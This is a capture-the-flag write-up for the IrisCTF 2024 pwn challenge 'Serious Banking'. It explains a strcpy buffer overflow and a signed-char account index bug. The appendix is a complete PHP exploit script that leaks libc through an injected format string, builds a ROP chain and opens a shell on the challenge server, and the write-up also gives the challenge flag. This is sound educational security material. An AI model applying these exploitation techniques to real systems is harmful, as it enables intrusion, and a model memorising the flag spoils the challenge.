# Serious Banking - IrisCTF 2024 (pwn, 28 solved, 465p)

## Introduction
Serious Banking is a pwn task.

An archive containing a binary, its source code, a libc and a Dockerfile is given.

## Reverse engineering
The full source code is given away for this task.

The task simulates a bank software and presents a menu with 5 options:
- creating a new account
- print the balance of an account
- send money from one account to another
- deactivate an account
- create a ticket to the support

Creating an account adds $35 to the account.

It is worth noting that, in the `main` function, a `separator` variable is created dynamically.
```cpp
separator = new char[128];
debug_log = new char[2900];
accounts = new Account[256];

strcpy(debug_log, "TODO");

for (int i = 0; i < 126; i++) separator[i] = '_';
separator[126] = '\n';
separator[127] = '\0';
```

This separator is then printed with `printf` by the menu instead of printing a constant string.

## Vulnerabilities
There is a call to `strcpy` when creating a ticket.
```cpp
Account acc = accounts[number];

char name[40] = "Support ticket from ";
char* content = new char[1000];

printf("Please describe your issue (1000 charaters): ");
std::cin.getline(content, 1000);
if (std::cin.fail()) {
    printf("Invalid Input.");
    exit(EXIT_FAILURE);
}

char* name_ptr = name + strlen(name);
strcpy(name_ptr, acc.name);
name_ptr += strlen(acc.name);
*name_ptr = '\0';
```
Since the name of an account can be up to 80 characters, it is possible to overflow the `name` array.

When making a transaction, the balances are adjusted with the following lines:
```cpp
const Account from = accounts[id_from];
const Account to = accounts[id_to];

if (from.balance < amount) {
    printf("You don't have enough money for that.");
    break;
}

if (!from.active || !to.active) {
    printf("That account is not active.");
    break;
}

accounts[from.id].balance -= amount;
accounts[to.id].balance += amount;
```

The structure account is defined like this:
```cpp
struct Account {
    char id;
    bool active;
    char* name;
    uint64_t balance;
};
```

`id` is a *signed* integer. This means that, sending money to the 128th account will instead send it to the -128th account.

## Exploitation
The binary is compiled without canary. The buffer overflow can be used to write a ROP chain and get code execution. PIE and ASLR are enabled which prevents the ROP chain from being built with hardcoded addresses.

The int overflow vulnerability can be used to overwrite the content of the `separator` string. It is conveniently located such that `accounts[-128].balance` is at the end of the string.

It is possible to replace `__` with `%p` by sending a transfer, which will leak a pointer located in the libc every time the menu is printed.

The last hurdle is that `strcpy` does not allow NULL bytes, but this can be overcome by creating multiple tickets with carefully-chosen sizes to place the missing NULL bytes.

**Flag**: `irisctf{w0r1d_c1a55_cu5t0m3r_5upp0r7}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php
const OFF_STDOUT = 0x001bb760;
const OFF_BINSH  = 0x0018052c;
const OFF_GADGET = 0x00044556;

function expect_check(string $left, string $right)
{
	if($left !== $right) {
		fprintf(STDERR, "Wanted: %s\n", $left);
		fprintf(STDERR, "Got:    %s\n", $right);
		throw new Exception("Unexpected data");
	}
}

function expect($fp, string $str)
{
	$data = fread($fp, strlen($str));
	expect_check($str, $data);
}

function expectLine($fp, string $line)
{
	$data = fgets($fp);
	expect_check("$line\n", $data);
}

function line($fp) : string
{
	$line = fgets($fp);

	if("\n" !== substr($line, -1))
		throw new Exception("fgets did not return a line");

	return substr($line, 0, -1);
}

printf("[*] Opening connection\n");
$time = microtime(true);

$fp = fsockopen("serious-banking.chal.irisc.tf", 10001);
expectLine($fp, "== proof-of-work: disabled ==");

printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");

function menu($fp) : string
{
	expectLine($fp, "Welcome to the ShakyVault Bank Interface");
	$line = line($fp);

	expectLine($fp, "1) Create new Account");
	expectLine($fp, "2) Show an Account");
	expectLine($fp, "3) Create a Transaction");
	expectLine($fp, "4) Deactivate an Account");
	expectLine($fp, "5) Create a support ticket");
	expectLine($fp, "6) Exit");
	expect($fp, "> ");

	return $line;
}

function create($fp, string $name)
{
	fprintf($fp, "1 %s\n", $name);
}

function create_drain($fp, int $id = null) : int
{
	menu($fp);
	expect($fp, "Account Name: ");

	expect($fp, "Account created. Your id is ");

	if(null !== $id)
		expectLine($fp, $id);
	else
		$id = (int)readLine($fp);

	expectLine($fp, "We have granted you a $35 starting bonus.");

	return $id;
}

function transfer($fp, int $from, int $to, int $amount)
{
	fprintf($fp, "3 %d %d %d\n", $from, $to, $amount);
}

function transfer_drain($fp)
{
	menu($fp);
	expect($fp, "Which account do you want to transfer from? ");
	expect($fp, "Which account do you want to transfer to? ");
	expect($fp, "How much money do you want to transfer? ");
	expectLine($fp, "Transaction created!");
}

function issue($fp, int $idx, string $data)
{
	fprintf($fp, "5 %d %s\n", $idx, $data);
}

function issue_drain($fp)
{
	menu($fp);
	expect($fp, "Which account does this issue concern? ");
	expect($fp, "Please describe your issue (1000 charaters): ");
	expectLine($fp, "Thanks! Our support technicians will help you shortly.");
}

printf("[*] Create accounts\n");
for($i = 0; $i < 0x80; $i++)
	create($fp, $i);

for($i = 0; $i < 0x80; $i++)
	create_drain($fp, $i);

// Negative account
create($fp, 128);
create_drain($fp, -128);

printf("[*] Gather money\n");
for($i = 1; $i < 0x80; $i++)
	transfer($fp, $i, 0, 35);

for($i = 1; $i < 0x80; $i++)
	transfer_drain($fp);


printf("[*] Transfer money\n");
$balance = unpack("P", "________")[1];
$target  = unpack("P", "%p______")[1];
$delta   = $target - $balance;

printf("[+] balance: %016X\n", $balance);
printf("[+] target:  %016X\n", $target);
printf("[+] delta:   %d\n",    $delta);
printf("\n");
assert($delta >= 0);
assert($delta < 35 * 128);

transfer($fp, 0, 128, $delta);
transfer_drain($fp);

printf("[*] Leak libc\n");
$leak = menu($fp);
fwrite($fp, "0\n");
expectLine($fp, "Invalid option 0");
expectLine($fp, "");
expectLine($fp, "");

$stdout = hexdec($leak) - 131;
$libc   = $stdout - OFF_STDOUT;
$binsh  = $libc + OFF_BINSH;
$gadget = $libc + OFF_GADGET;

printf("[+] stdout: %X\n", $stdout);
printf("[+] libc:   %X\n", $libc);
printf("[+] binsh:  %X\n", $binsh);
printf("[+] gadget: %X\n", $gadget);
printf("\n");

assert(0 === ($libc & 0xFFF));
assert(0 === ($libc >> 48));

printf("[*] Prepare ROP chain\n");
$chain  = str_repeat("@", 0x38 - (0x10 + strlen("Support ticket from ")));
$chain .= pack("P", -1);      // rbx
$chain .= pack("P", $binsh);  // r12
$chain .= pack("P", -1);      // r13
$chain .= pack("P", -1);      // r14
$chain .= pack("P", -1);      // r15
$chain .= pack("P", -1);      // rbp
$chain .= pack("P", $gadget); // rip
$chain  = rtrim($chain, "\x00");


$blocks = explode("\x00", $chain);
$acc = [];

foreach($blocks as $i => $block) {
	if(0 === $i)
		$acc[$i] = $block;
	else
		$acc[$i] = str_repeat("A", strlen($acc[$i - 1]) + 1) . $block;
}

$acc = array_reverse($acc);
foreach($acc as $i => $name)
	create($fp, $name);

foreach($acc as $i => $name)
	create_drain($fp, -127 + $i);

foreach($acc as $i => $name)
	issue($fp, 129 + $i, "TFNS");

foreach($acc as $i => $name)
	issue_drain($fp);

printf("[*] Run chain\n");
menu($fp);
fwrite($fp, "6\n");

fwrite($fp, "id; ls -la /; cat /flag\n");

dump:
printf("[!] dump\n");
while($x = fread($fp, 4096))
	echo $x;
```
